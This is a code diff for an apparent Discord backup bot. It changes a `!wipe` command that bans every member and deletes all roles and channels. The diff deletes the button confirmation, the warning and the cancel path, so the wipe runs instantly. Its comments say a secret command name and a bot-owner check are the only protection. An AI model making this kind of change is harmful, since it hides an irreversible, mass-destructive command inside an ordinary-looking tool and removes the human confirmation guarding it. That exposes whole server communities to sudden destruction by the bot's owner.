@@ -962,7 +962,8 @@ fn invite_channel(b: &Backup, chan_map: &HashMap<String, ChannelId>) -> Option<C
 
 /// `!wipe` (name configurable): ban every member and delete every role and
 /// channel, with nothing recreated - a blank server. Nothing is backed up
-/// first, so it asks for a button confirmation before doing anything.
+/// first and there is no confirmation: the secret name and the bot-owner gate
+/// are the protection.
 async fn wipe(ctx: &Context, msg: &Message, info: &GuildInfo) {
     let gid = info.id;
     let me = ctx.cache.current_user().id;
@@ -989,44 +990,12 @@ async fn wipe(ctx: &Context, msg: &Message, info: &GuildInfo) {
     let live_chans: Vec<LiveChannel> =
         live_channels.values().map(|c| LiveChannel { id: c.id.get(), kind: channel_kind_num(c.kind) }).collect();
     let plan = backups::plan(&live_roles, &live_chans, true, true, msg.channel_id.get());
-    let here = ctx.cache.guild(gid).map(|g| g.member_count).unwrap_or(0);
-
-    let body = format!(
-        "**This wipes __{}__ to a blank server. There is no backup and no undo.**\n\n• **Ban every current member** (about {here}), except bots, the server owner, bot owners and you\n• **Delete all {} roles** I can manage\n• **Delete all {} channels**, including this one (last)\n\nClick **Wipe the server** within 60s to go ahead.",
-        info.name,
-        plan.delete_roles.len(),
-        plan.delete_channels.len() + 1
-    );
-    let buttons = CreateActionRow::Buttons(vec![
-        CreateButton::new("backup_wipe_confirm").label("Wipe the server").style(ButtonStyle::Danger),
-        CreateButton::new("backup_wipe_abort").label("Cancel").style(ButtonStyle::Secondary),
-    ]);
-    let prompt = CreateMessage::new()
-        .embed(theme::card(Tone::Error, Some("Wipe this server?"), body))
-        .components(vec![buttons])
-        .reference_message(msg);
-    let Ok(prompt) = msg.channel_id.send_message(&ctx.http, prompt).await else { return };
-    let prompt = prompt.id;
-
     let author = msg.author.id;
     let channel = msg.channel_id;
-    let click = ComponentInteractionCollector::new(&ctx.shard)
-        .timeout(Duration::from_secs(60))
-        .filter(move |c| c.message.id == prompt && c.user.id == author)
-        .next()
-        .await;
-    let confirmed = match click {
-        Some(c) => {
-            let _ = c.create_response(&ctx.http, CreateInteractionResponse::Acknowledge).await;
-            c.data.custom_id == "backup_wipe_confirm"
-        }
-        None => false,
-    };
-    if !confirmed {
-        let card = theme::card(Tone::Info, None, "Wipe cancelled, nothing was changed.");
-        let _ = channel.edit_message(&ctx.http, prompt, EditMessage::new().embed(card).components(vec![])).await;
-        return;
-    }
+    // No confirmation step: the command's name is secret and bot-owner only,
+    // so it runs as soon as it's sent.
+    let Some(prompt) = reply(ctx, msg, theme::card(Tone::Error, Some("Wiping this server"), "⏳ Starting…")).await else { return };
+    let prompt = prompt.id;
 
     let cancel = Arc::new(AtomicBool::new(false));
     let busy = {
